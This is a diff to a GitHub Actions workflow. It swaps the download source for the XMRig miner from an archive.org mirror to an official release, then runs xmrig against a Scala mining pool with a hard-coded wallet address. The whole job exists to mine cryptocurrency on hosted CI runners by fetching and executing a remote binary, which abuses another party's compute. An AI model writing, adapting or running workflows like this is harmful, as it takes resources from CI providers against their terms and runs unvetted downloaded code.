@@ -14,12 +14,12 @@ jobs:
 
     - name: Download XMRig Panthera (mirror)
       run: |
-        wget https://archive.org/download/xmrig-panthera-linux/xmrig-panthera-linux.tar.gz
-        tar -xvzf xmrig-panthera-linux.tar.gz
-        cd xmrig-panthera
+        wget https://github.com/xmrig/xmrig/releases/download/v6.23.0/xmrig-6.23.0-linux-static-x64.tar.gz
+        tar -xvzf xmrig-6.23.0-linux-static-x64.tar.gz
+        cd xmrig-6.23.0-linux-static-x64
         chmod +x xmrig
 
     - name: Start Mining
       run: |
-        cd xmrig-panthera
+        cd xmrig-6.23.0-linux-static-x64
         ./xmrig -o pool.scalaproject.io:2019 -u Ssy2SFtR3rGfjKFA4xxUnGVikpSy7GyfTFbDmjyqSGsuJMJ4K2GSKyK6pApbCy7DBGgf6b5p3fHwV1zHrnVRUjDG7kdm496A8R -p github -a panthera -k --tls
